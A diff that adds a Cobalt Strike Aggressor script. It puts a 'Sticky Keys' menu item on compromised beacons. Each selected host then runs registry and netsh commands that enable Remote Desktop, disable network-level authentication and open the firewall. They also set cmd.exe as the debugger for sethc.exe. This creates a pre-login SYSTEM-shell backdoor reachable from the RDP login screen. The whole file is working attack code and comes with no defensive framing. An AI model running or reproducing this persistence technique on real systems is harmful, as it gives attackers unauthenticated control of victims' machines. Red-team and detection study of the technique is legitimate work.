@@ -1,0 +1,17 @@
+popup beacon_top {
+   item "Sticky Keys" {
+      local('$bid');
+      foreach $bid ($1) {
+         stickykeys($bid);
+      }
+   }
+}
+ 
+sub stickykeys {
+   bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+   bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"');
+   bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+   bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
+   bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+   bshell($1, 'net start TermService');
+}
